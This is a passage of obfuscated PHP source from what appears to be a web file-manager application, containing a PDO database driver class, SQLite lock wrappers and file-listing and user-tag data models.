$Í×»÷­Ø[454]); $ŠÏîÁó = array_merge($«İºé‹Œ, $¡úú¨Ï); $ªĞä¢éå = Model($Í×»÷­Ø[538])->userListInfo($ŠÏîÁó); foreach ($¾­ÀˆÂ as &$²‘ ğÙÒ) { $¥†¥åŠ« = $²‘ ğÙÒ[$Í×»÷­Ø[452]]; $²‘ ğÙÒ[$Í×»÷­Ø[452]] = $ªĞä¢éå[$¥†¥åŠ«] ? $ªĞä¢éå[$¥†¥åŠ«] : !1; $¥†¥åŠ« = $²‘ ğÙÒ[$Í×»÷­Ø[454]]; $²‘ ğÙÒ[$Í×»÷­Ø[454]] = $ªĞä¢éå[$¥†¥åŠ«] ? $ªĞä¢éå[$¥†¥åŠ«] : !1; if (isset($²‘ ğÙÒ[$Í×»÷­Ø[465]]) && $²‘ ğÙÒ[$Í×»÷­Ø[465]][$Í×»÷­Ø[539]]) { $ÒìĞ½ ü = $GLOBALS[$Í×»÷­Ø[6]][$Í×»÷­Ø[90]][$Í×»÷­Ø[540]]; if ($²‘ ğÙÒ[$Í×»÷­Ø[465]][$Í×»÷­Ø[541]] <= time() - $ÒìĞ½ ü) { $this->metaSet($²‘ ğÙÒ[$Í×»÷­Ø[403]], $Í×»÷­Ø[539], null); $this->metaSet($²‘ ğÙÒ[$Í×»÷­Ø[403]], $Í×»÷­Ø[541], null); unset($²‘ ğÙÒ[$Í×»÷­Ø[465]][$Í×»÷­Ø[539]]); continue; } $–è†ÆØ = $²‘ ğÙÒ[$Í×»÷­Ø[465]][$Í×»÷­Ø[539]]; $²‘ ğÙÒ[$Í×»÷­Ø[465]][$Í×»÷­Ø[542]] = Model($Í×»÷­Ø[538])->getInfoSimpleOuter($–è†ÆØ); } } unset($²‘ ğÙÒ); } public function parentLevelArray($«Şé ’¼) { $öŞ³›Ûê =& $_SERVER[¥Ÿ©ÒèÌ]; $«Şé ’¼ = explode($öŞ³›Ûê[50], trim($«Şé ’¼, $öŞ³›Ûê[50])); return array_remove_value($«Şé ’¼, $öŞ³›Ûê[190]); } public function listAll($ËŞ’¶) { $Ø¦üØï =& $_SERVER[¥Ÿ©ÒèÌ]; $Î’µ¥õ = $this->sourceInfo($ËŞ’¶); $–ğ¹ç§ = array($Ø¦üØï[543] => array($Ø¦üØï[544], $Î’µ¥õ[$Ø¦üØï[521]] . $ËŞ’¶ . $Ø¦üØï[545]), $Ø¦üØï[546] => 0); $÷íÑ•É‡ = $Ø¦üØï[547]; $Ç¦ÒèÖ = "\x4c\105\106\124\40\x4a\117\111\x4e\40{$this->tablePrefix}\x69\157\137\146\151\154\145\x20\x66\151\154\145\40\157\x6e\40\163\x6f\x75\162\143\145\x2e\x66\x69\x6c\145\111\x44\40\75\x20\146\151\x6c\x65\x2e\x66\x69\x6c\145\x49\104"; $·•µ˜ó = $this->alias($Ø¦üØï[444])->field($÷íÑ•É‡)->where($–ğ¹ç§)->join($Ç¦ÒèÖ)->select(); $this->_listAppendAuth($·•µ˜ó); $this->_listAppendUser($·•µ˜ó); $this->_listAppendPath($·•µ˜ó); $·•µ˜ó = array_to_keyvalue($·•µ˜ó, $Ø¦üØï[403]); $ßî™Šº = "\57{$Î’µ¥õ[$Ø¦üØï[32]]}\57"; $ßî™Šº = $ßî™Šº == $Ø¦üØï[529] ? $Ø¦üØï[8] : $ßî™Šº; $ûş¢øù = array(); foreach ($·•µ˜ó as $‡à§˜Œ¯ => $œšÑ£š) { $‘Éİ¦… = $this->parentLevelArray($œšÑ£š[$Ø¦üØï[521]]); array_shift($‘Éİ¦…); $°¢­ëÚ = $ßî™Šº; for ($ğ×•ó¿¶ = 0; $ğ×•ó¿¶ < count($‘Éİ¦…); $ğ×•ó¿¶++) { $°¢­ëÚ .= $·•µ˜ó[$‘Éİ¦…[$ğ×•ó¿¶]][$Ø¦üØï[32]] . $Ø¦üØï[8]; } $°¢­ëÚ .= $œšÑ£š[$Ø¦üØï[32]]; if ($œšÑ£š[$Ø¦üØï[411]]) { $°¢­ëÚ .= $Ø¦üØï[8]; } $°¢­ëÚ = str_replace($Ø¦üØï[529], $Ø¦üØï[8], $°¢­ëÚ); $°¢­ëÚ = str_replace($Ø¦üØï[529], $Ø¦üØï[8], $°¢­ëÚ); $¸®Ö¶‰¿ = array($Ø¦üØï[422] => str_replace($Ø¦üØï[529], $Ø¦üØï[8], $°¢­ëÚ), $Ø¦üØï[548] => intval($œšÑ£š[$Ø¦üØï[411]]), $Ø¦üØï[87] => $this->pathInfoFilter($œšÑ£š)); if (!$œšÑ£š[$Ø¦üØï[411]]) { $¸®Ö¶‰¿[$Ø¦üØï[467]] = $œšÑ£š[$Ø¦üØï[467]]; $¸®Ö¶‰¿[$Ø¦üØï[88]] = $œšÑ£š[$Ø¦üØï[78]]; } $ûş¢øù[] = $¸®Ö¶‰¿; } return $ûş¢øù; } } goto FÊçî¦Ùº; AçíÑëêïÛ: class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($ïù²Îçå = '') { $ŞŠÑ¶ˆ‚ =& $_SERVER[¥Ÿ©ÒèÌ]; if (!class_exists($ŞŠÑ¶ˆ‚[900])) { think_exception(think_lang($ŞŠÑ¶ˆ‚[14]) . $ŞŠÑ¶ˆ‚[901]); } if (!empty($ïù²Îçå)) { $this->config = $ïù²Îçå; if (empty($this->config[$ŞŠÑ¶ˆ‚[17]])) { $this->config[$ŞŠÑ¶ˆ‚[17]] = array(); } } } public function connect($şéıÑÂŠ = '', $áÅœä€ = 0) { $ğ§•°ğÔ =& $_SERVER[¥Ÿ©ÒèÌ]; if (!isset($this->linkID[$áÅœä€])) { if (empty($şéıÑÂŠ)) { $şéıÑÂŠ = $this->config; } $µèúáğœ = !empty($şéıÑÂŠ[$ğ§•°ğÔ[17]][$ğ§•°ğÔ[18]]) ? $şéıÑÂŠ[$ğ§•°ğÔ[17]][$ğ§•°ğÔ[18]] : $this->pconnect; if ($µèúáğœ) { $şéıÑÂŠ[$ğ§•°ğÔ[17]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$áÅœä€] = new PDO($şéıÑÂŠ[$ğ§•°ğÔ[902]], $şéıÑÂŠ[$ğ§•°ğÔ[874]], $şéıÑÂŠ[$ğ§•°ğÔ[875]], $şéıÑÂŠ[$ğ§•°ğÔ[17]]); } catch (PDOException $¤æ¶¤­’) { think_exception($¤æ¶¤­’->getMessage()); } $this->dbType = $this->_getDsnType($şéıÑÂŠ[$ğ§•°ğÔ[902]]); if (in_array($this->dbType, array($ğ§•°ğÔ[903], $ğ§•°ğÔ[904], $ğ§•°ğÔ[905], $ğ§•°ğÔ[906]))) { think_exception($ğ§•°ğÔ[907] . $this->dbType . $ğ§•°ğÔ[908] . $this->dbType . $ğ§•°ğÔ[909]); } if (!$this->linkID[$áÅœä€]) { think_exception($ğ§•°ğÔ[910]); } try { $this->linkID[$áÅœä€]->exec($ğ§•°ğÔ[911] . think_config($ğ§•°ğÔ[877])); } catch (Exception $¤æ¶¤­’) { } $this->connected = !0; if (1 != think_config($ğ§•°ğÔ[22])) { unset($this->config); } } return $this->linkID[$áÅœä€]; } public function free() { $this->PDOStatement = null; } public function query($¨®òÛ›˜, $•Ï‹·¦ = array()) { $Ã×½…‹ó =& $_SERVER[¥Ÿ©ÒèÌ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $¨®òÛ›˜; if (!empty($•Ï‹·¦)) { $this->queryStr .= $Ã×½…‹ó[912] . print_r($•Ï‹·¦, !0) . $Ã×½…‹ó[913]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($Ã×½…‹ó[23], 1); think_status($Ã×½…‹ó[24]); $this->PDOStatement = $this->_linkID->prepare($¨®òÛ›˜); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $ë¼Èî°„ = $this->PDOStatement->execute($•Ï‹·¦); $this->debug(); if (!1 === $ë¼Èî°„) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($‚£§á‡º, $™ÊàâòÓ = array()) { $ÇÜ õÖ =& $_SERVER[¥Ÿ©ÒèÌ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $‚£§á‡º; if (!empty($™ÊàâòÓ)) { $this->queryStr .= $ÇÜ õÖ[912] . print_r($™ÊàâòÓ, !0) . $ÇÜ õÖ[913]; } $éØ·Ñ = !1; if ($this->dbType == $ÇÜ õÖ[906]) { if (preg_match($ÇÜ õÖ[914], $this->queryStr, $â‰Ó£¾¡)) { $this->table = think_config($ÇÜ õÖ[915]) . str_ireplace(think_config($ÇÜ õÖ[916]), $ÇÜ õÖ[382], $â‰Ó£¾¡[2]); $éØ·Ñ = (bool) $this->query($ÇÜ õÖ[917] . strtoupper($this->table) . $ÇÜ õÖ[58]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($ÇÜ õÖ[25], 1); think_status($ÇÜ õÖ[24]); $this->PDOStatement = $this->_linkID->prepare($‚£§á‡º); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $¨Å¯ ÊÒ = $this->PDOStatement->execute($™ÊàâòÓ); $this->debug(); if (!1 === $¨Å¯ ÊÒ) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($éØ·Ñ || preg_match($ÇÜ õÖ[918], $‚£§á‡º)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $î½®œ¤ = $this->_linkID->commit(); $this->transTimes = 0; if (!$î½®œ¤) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $ªÍÙ–‚œ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$ªÍÙ–‚œ) { $this->error(); return !1; } } return !0; } private function getAll() { $¬—Ùò®Ø = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($¬—Ùò®Ø); return $¬—Ùò®Ø; } public function getFields($á‘Ş²ô„) { $Æıëëü =& $_SERVER[¥Ÿ©ÒèÌ]; $this->initConnect(!0); if (think_config($Æıëëü[919])) { $ğ½Âá¨» = str_replace($Æıëëü[920], $á‘Ş²ô„, think_config($Æıëëü[919])); } else { switch ($this->dbType) { case $Æıëëü[903]: case $Æıëëü[921]: $ğ½Âá¨» = "\x53\105\114\105\x43\x54\x20\40\40\x63\157\x6c\x75\x6d\156\x5f\156\141\155\x65\x20\x61\163\x20\x27\116\141\x6d\x65\47\54\x20\40\40\144\141\x74\141\137\164\x79\x70\x65\40\x61\x73\x20\x27\124\x79\x70\x65\x27\54\x20\40\x20\x63\x6f\x6c\165\x6d\x6e\137\144\x65\146\x61\x75\x6c\x74\x20\x61\x73\40\x27\104\145\x66\x61\165\154\x74\47\x2c\x20\x20\40\x69\x73\137\156\165\x6c\x6c\141\142\154\x65\40\x61\163\40\x27\116\165\154\x6c\x27\12\x9\11\106\122\117\115\x9\151\x6e\146\157\x72\155\x61\x74\x69\157\156\137\x73\x63\150\x65\155\141\x2e\x74\141\x62\154\145\x73\x20\x41\123\40\x74\12\x9\11\x4a\117\111\x4e\11\x69\x6e\146\x6f\162\155\141\164\151\x6f\x6e\137\163\x63\150\145\x6d\x61\x2e\143\x6f\154\165\155\x6e\163\x20\101\x53\x20\x63\12\11\11\x4f\116\40\x20\x74\x2e\x74\x61\x62\x6c\145\x5f\x63\x61\164\x61\x6c\x6f\147\40\x3d\40\x63\x2e\x74\x61\x62\154\x65\x5f\143\x61\x74\x61\x6c\157\x67\12\11\x9\101\x4e\x44\40\x74\x2e\164\x61\x62\x6c\x65\x5f\163\x63\150\145\x6d\141\40\x3d\40\143\56\x74\x61\x62\154\145\137\x73\x63\150\x65\x6d\x61\12\11\11\x41\116\x44\x20\x74\56\x74\141\142\154\x65\x5f\156\x61\155\x65\x20\x3d\x20\x63\56\x74\x61\x62\x6c\x65\x5f\x6e\141\155\x65\xa\x9\11\x57\110\x45\x52\x45\x20\x20\40\x74\x2e\164\141\x62\x6c\145\x5f\x6e\141\x6d\145\40\x3d\40\47{$á‘Ş²ô„}\47"; break; case $Æıëëü[922]: $ğ½Âá¨» = $Æıëëü[923] . $á‘Ş²ô„ . $Æıëëü[924]; break; case $Æıëëü[904]: case $Æıëëü[906]: $ğ½Âá¨» = $Æıëëü[925] . $Æıëëü[926] . $Æıëëü[927] . strtoupper($á‘Ş²ô„) . $Æıëëü[928] . strtoupper($á‘Ş²ô„) . $Æıëëü[929]; break; case $Æıëëü[930]: $ğ½Âá¨» = $Æıëëü[931] . $á‘Ş²ô„ . $Æıëëü[932]; break; case $Æıëëü[905]: break; case $Æıëëü[933]: default: $ğ½Âá¨» = $Æıëëü[934] . ($this->dbType == $Æıëëü[933] ? "\x60{$á‘Ş²ô„}\x60" : $á‘Ş²ô„); } } $ë¥ Æ´² = $this->query($ğ½Âá¨»); $‰Òôã½ö = array(); if ($ë¥ Æ´²) { foreach ($ë¥ Æ´² as $öÀŠ‘Õ¶ => $Î‘ÃÊÅ) { $Î‘ÃÊÅ = array_change_key_case($Î‘ÃÊÅ); $Î‘ÃÊÅ[$Æıëëü[32]] = isset($Î‘ÃÊÅ[$Æıëëü[32]]) ? $Î‘ÃÊÅ[$Æıëëü[32]] : $Æıëëü[382]; $Î‘ÃÊÅ[$Æıëëü[33]] = isset($Î‘ÃÊÅ[$Æıëëü[33]]) ? $Î‘ÃÊÅ[$Æıëëü[33]] : $Æıëëü[382]; $üõû¬€ß = isset($Î‘ÃÊÅ[$Æıëëü[277]]) ? $Î‘ÃÊÅ[$Æıëëü[277]] : $Î‘ÃÊÅ[$Æıëëü[32]]; $‰Òôã½ö[$üõû¬€ß] = array($Æıëëü[32] => $üõû¬€ß, $Æıëëü[33] => $Î‘ÃÊÅ[$Æıëëü[33]], $Æıëëü[35] => (bool) (isset($Î‘ÃÊÅ[$Æıëëü[104]]) && $Î‘ÃÊÅ[$Æıëëü[104]] === $Æıëëü[12] || isset($Î‘ÃÊÅ[$Æıëëü[35]]) && $Î‘ÃÊÅ[$Æıëëü[35]] === $Æıëëü[12]), $Æıëëü[37] => isset($Î‘ÃÊÅ[$Æıëëü[37]]) ? $Î‘ÃÊÅ[$Æıëëü[37]] : (isset($Î‘ÃÊÅ[$Æıëëü[56]]) ? $Î‘ÃÊÅ[$Æıëëü[56]] : $Æıëëü[382]), $Æıëëü[39] => isset($Î‘ÃÊÅ[$Æıëëü[95]]) ? strtolower($Î‘ÃÊÅ[$Æıëëü[95]]) == $Æıëëü[41] : (isset($Î‘ÃÊÅ[$Æıëëü[57]]) ? $Î‘ÃÊÅ[$Æıëëü[57]] : !1), $Æıëëü[42] => isset($Î‘ÃÊÅ[$Æıëëü[935]]) ? strtolower($Î‘ÃÊÅ[$Æıëëü[935]]) == $Æıëëü[44] : (isset($Î‘ÃÊÅ[$Æıëëü[95]]) ? $Î‘ÃÊÅ[$Æıëëü[95]] : !1)); } } return $‰Òôã½ö; } public function getTables($ğÀ”ø‰Ü = '') { $ÛÔ¦´µÒ =& $_SERVER[¥Ÿ©ÒèÌ]; if (think_config($ÛÔ¦´µÒ[936])) { $§°ªå´Ó = str_replace($ÛÔ¦´µÒ[937], $ğÀ”ø‰Ü, think_config($ÛÔ¦´µÒ[936])); } else { switch ($this->dbType) { case $ÛÔ¦´µÒ[904]: case $ÛÔ¦´µÒ[906]: $§°ªå´Ó = $ÛÔ¦´µÒ[938]; break; case $ÛÔ¦´µÒ[903]: case $ÛÔ¦´µÒ[921]: $§°ªå´Ó = $ÛÔ¦´µÒ[939]; break; case $ÛÔ¦´µÒ[930]: $§°ªå´Ó = $ÛÔ¦´µÒ[940]; break; case $ÛÔ¦´µÒ[905]: think_exception(think_lang($ÛÔ¦´µÒ[941]) . $ÛÔ¦´µÒ[942]); break; case $ÛÔ¦´µÒ[922]: $§°ªå´Ó = $ÛÔ¦´µÒ[45] . $ÛÔ¦´µÒ[46] . $ÛÔ¦´µÒ[47]; break; case $ÛÔ¦´µÒ[933]: default: if (!empty($ğÀ”ø‰Ü)) { $§°ªå´Ó = $ÛÔ¦´µÒ[885] . $ğÀ”ø‰Ü . $ÛÔ¦´µÒ[886]; } else { $§°ªå´Ó = $ÛÔ¦´µÒ[887]; } } } $Œ¼­©Ú§ = $this->query($§°ªå´Ó); $“şŠ‰º = array(); foreach ($Œ¼­©Ú§ as $¯áŞ”Ûæ => $âõà±Ÿ) { $“şŠ‰º[$¯áŞ”Ûæ] = current($âõà±Ÿ); } return $“şŠ‰º; } protected function parseLimit($ñËïƒØ) { $‡–ô§  =& $_SERVER[¥Ÿ©ÒèÌ]; $Ïì¾û¶ = $‡–ô§ [12]; if (!empty($ñËïƒØ)) { switch ($this->dbType) { case $‡–ô§ [930]: case $‡–ô§ [922]: $ñËïƒØ = explode($‡–ô§ [50], $ñËïƒØ); if (count($ñËïƒØ) > 1) { $Ïì¾û¶ .= $‡–ô§ [51] . $ñËïƒØ[1] . $‡–ô§ [52] . $ñËïƒØ[0] . $‡–ô§ [53]; } else { $Ïì¾û¶ .= $‡–ô§ [51] . $ñËïƒØ[0] . $‡–ô§ [53]; } break; case $‡–ô§ [903]: case $‡–ô§ [921]: break; case $‡–ô§ [905]: break; case $‡–ô§ [904]: case $‡–ô§ [906]: break; case $‡–ô§ [933]: default: $Ïì¾û¶ .= $‡–ô§ [51] . $ñËïƒØ . $‡–ô§ [53]; } } return $Ïì¾û¶; } public function parseKey(&$¦¡ŠƒÁÊ, $çä¸é£â = true) { $Î×»·£­ =& $_SERVER[¥Ÿ©ÒèÌ]; if ($çä¸é£â) { $¦¡ŠƒÁÊ = $this->parseKeyCheck($¦¡ŠƒÁÊ); } if ($this->dbType == $Î×»·£­[933]) { if ($¦¡ŠƒÁÊ != $Î×»·£­[181] && !preg_match($Î×»·£­[897], $¦¡ŠƒÁÊ)) { $¦¡ŠƒÁÊ = $Î×»·£­[389] . trim($¦¡ŠƒÁÊ, $Î×»·£­[389]) . $Î×»·£­[389]; } return $¦¡ŠƒÁÊ; } else { return parent::parseKey($¦¡ŠƒÁÊ, $çä¸é£â); } } public function close() { $this->_linkID = null; } public function error() { $†Ç×àÆĞ =& $_SERVER[¥Ÿ©ÒèÌ]; if ($this->PDOStatement) { $ñ…¤Ìäó = $this->PDOStatement->errorInfo(); $this->error = $ñ…¤Ìäó[1] . $†Ç×àÆĞ[4] . $ñ…¤Ìäó[2]; } else { $this->error = $†Ç×àÆĞ[12]; } if ($†Ç×àÆĞ[12] != $this->queryStr) { $this->error .= LNG($†Ç×àÆĞ[48]) . $this->queryStr; } think_trace($this->error, $†Ç×àÆĞ[12], $†Ç×àÆĞ[49]); return $this->error; } public function escapeString($‹ïıìƒú) { $êÒ¾®»† =& $_SERVER[¥Ÿ©ÒèÌ]; switch ($this->dbType) { case $êÒ¾®»†[930]: case $êÒ¾®»†[903]: case $êÒ¾®»†[921]: case $êÒ¾®»†[933]: return addslashes($‹ïıìƒú); case $êÒ¾®»†[905]: case $êÒ¾®»†[922]: case $êÒ¾®»†[904]: case $êÒ¾®»†[906]: return str_ireplace($êÒ¾®»†[58], $êÒ¾®»†[59], $‹ïıìƒú); } } protected function parseValue($Ø¹î¦¾¦) { $ºÉ¨ÛÛ =& $_SERVER[¥Ÿ©ÒèÌ]; if (is_string($Ø¹î¦¾¦)) { $”§ïÒñ = strpos($Ø¹î¦¾¦, $ºÉ¨ÛÛ[4]) === 0 && in_array($Ø¹î¦¾¦, array_keys($this->bind)); $Ø¹î¦¾¦ = $”§ïÒñ ? $this->escapeString($Ø¹î¦¾¦) : $ºÉ¨ÛÛ[943] . $this->escapeString($Ø¹î¦¾¦) . $ºÉ¨ÛÛ[943]; } elseif (isset($Ø¹î¦¾¦[0]) && is_string($Ø¹î¦¾¦[0]) && strtolower($Ø¹î¦¾¦[0]) == $ºÉ¨ÛÛ[301]) { $Ø¹î¦¾¦ = $this->escapeString($Ø¹î¦¾¦[1]); } elseif (is_array($Ø¹î¦¾¦)) { $Ø¹î¦¾¦ = array_map(array($this, $ºÉ¨ÛÛ[944]), $Ø¹î¦¾¦); } elseif (is_bool($Ø¹î¦¾¦)) { $Ø¹î¦¾¦ = $Ø¹î¦¾¦ ? $ºÉ¨ÛÛ[89] : $ºÉ¨ÛÛ[190]; } elseif (is_null($Ø¹î¦¾¦)) { $Ø¹î¦¾¦ = $ºÉ¨ÛÛ[104]; } return $Ø¹î¦¾¦; } public function getLastInsertId() { $©êàÃ˜Í =& $_SERVER[¥Ÿ©ÒèÌ]; switch ($this->dbType) { case $©êàÃ˜Í[930]: case $©êàÃ˜Í[922]: case $©êàÃ˜Í[903]: case $©êàÃ˜Í[921]: case $©êàÃ˜Í[905]: case $©êàÃ˜Í[933]: return $this->_linkID->lastInsertId(); case $©êàÃ˜Í[904]: case $©êàÃ˜Í[906]: $²Á•ÌÚ° = $this->table; $óÎ€¬‚• = $this->query("\x53\x45\x4c\x45\x43\124\40{$²Á•ÌÚ°}\56\143\165\x72\162\166\141\154\x20\x63\165\x72\x72\166\x61\x6c\40\x46\122\x4f\x4d\40\144\x75\x61\154"); return $óÎ€¬‚• ? $óÎ€¬‚•[0][$©êàÃ˜Í[945]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($ãøÓìä) { $ğİ§¹ë =& $_SERVER[¥Ÿ©ÒèÌ]; if (!CacheLock::fileLock($ğİ§¹ë[13])) { return !1; } $±ÜÃ×Ğá = parent::query($ãøÓìä); CacheLock::fileUnLock($ğİ§¹ë[13]); return $±ÜÃ×Ğá; } public function execute($…İÆÉ•Á) { $‰ÕˆŠÍ¸ =& $_SERVER[¥Ÿ©ÒèÌ]; if (!CacheLock::fileLock($‰ÕˆŠÍ¸[13])) { return !1; } $¥®Ë²Š = parent::execute($…İÆÉ•Á); CacheLock::fileUnLock($‰ÕˆŠÍ¸[13]); return $¥®Ë²Š; } } class DbSqlite3 extends DbSqlite3Base { public function query($Û ùİàŠ) { $Ğ‰‘­’İ =& $_SERVER[¥Ÿ©ÒèÌ]; if (!CacheLock::fileLock($Ğ‰‘­’İ[13])) { return !1; } $ Ÿ¯Ñü· = parent::query($Û ùİàŠ); CacheLock::fileUnLock($Ğ‰‘­’İ[13]); return $ Ÿ¯Ñü·; } public function execute($€¡¾Ş©) { $¡æ½ûæ‰ =& $_SERVER[¥Ÿ©ÒèÌ]; if (!CacheLock::fileLock($¡æ½ûæ‰[13])) { return !1; } $»Õ¬ùçü = parent::execute($€¡¾Ş©); CacheLock::fileUnLock($¡æ½ûæ‰[13]); return $»Õ¬ùçü; } } goto a£›ßŞœ“·; e¯§®›İ¤Õ: class UserTagSourceModel extends ModelBase { protected $tableName = "\x75\x73\145\x72\x5f\x66\141\x76"; protected function cacheFunctionAlias($÷ƒ¼†î) { $÷“ÑÙÜõ =& $_SERVER[¥Ÿ©ÒèÌ]; return array($÷“ÑÙÜõ[1915] => array(USER_ID, $÷“ÑÙÜõ[1916])); } protected function listData() { $ŞğêÎÏ =& $_SERVER[¥Ÿ©ÒèÌ]; $¼ø…ÚÍ = array($ŞğêÎÏ[1630] => USER_ID, $ŞğêÎÏ[483] => array($ŞğêÎÏ[1919], 0)); $³›¤÷ò = $ŞğêÎÏ[1921]; $ßÉØÈØ = $this->field($³›¤÷ò)->where($¼ø…ÚÍ)->order($ŞğêÎÏ[1922])->select(); return $ßÉØÈØ ? $ßÉØÈØ : array(); } protected function listByTag($ò–¡ËæŠ) { } protected function addToTag($Ñİ×šÏ¶, $š•º»¢½) { $œüóê œ =& $_SERVER[¥Ÿ©ÒèÌ]; if (!Model($œüóê œ[2056])->listData($š•º»¢½) || !Model($œüóê œ[815])->pathInfo($Ñİ×šÏ¶)) { return !1; } $¾‡“§­÷ = array($œüóê œ[1630] => USER_ID, $œüóê œ[483] => $š•º»¢½, $œüóê œ[422] => $Ñİ×šÏ¶, $œüóê œ[423] => $œüóê œ[417], $œüóê œ[421] => $œüóê œ[12], $œüóê œ[1811] => 0); if ($this->where($¾‡“§­÷)->find()) { return !1; } return $this->add($¾‡“§­÷); } protected function removeFromTag($®á“‡ƒ¢, $ÚİµÖ¦•) { $¨ç¦äæÜ =& $_SERVER[¥Ÿ©ÒèÌ]; if (!Model($¨ç¦äæÜ[2056])->listData($ÚİµÖ¦•)) { return !1; } if (is_array($®á“‡ƒ¢)) { $®á“‡ƒ¢ = array($¨ç¦äæÜ[7], $®á“‡ƒ¢); } $´å¢Í¦’ = array($¨ç¦äæÜ[1630] => USER_ID, $¨ç¦äæÜ[483] => $ÚİµÖ¦•, $¨ç¦äæÜ[423] => $¨ç¦äæÜ[417], $¨ç¦äæÜ[422] => $®á“‡ƒ¢); return $this->where($´å¢Í¦’)->delete(); } protected function removeByTag($™×ÜìÄ¯) { $ñóéÒ¿„ =& $_SERVER[¥Ÿ©ÒèÌ]; if (!$™×ÜìÄ¯) { return !1; } $öŠ¬ŸĞı = array($ñóéÒ¿„[1630] => USER_ID, $ñóéÒ¿„[483] => $™×ÜìÄ¯); return $this->where($öŠ¬ŸĞı)->delete(); } protected function removeBySource($øÚ”ñ¶) { $°ÚË›ØŠ =& $_SERVER[¥Ÿ©ÒèÌ]; if (is_array($øÚ”ñ¶)) { $øÚ”ñ¶ = array($°ÚË›ØŠ[7], $øÚ”ñ¶); } $‘ÃëÍùÙ = array($°ÚË›ØŠ[1630] => USER_ID, $°ÚË›ØŠ[422] => $øÚ”ñ¶, $°ÚË›ØŠ[483] => array($°ÚË›ØŠ[1000], 0)); return $this->where($‘ÃëÍùÙ)->delete(); } }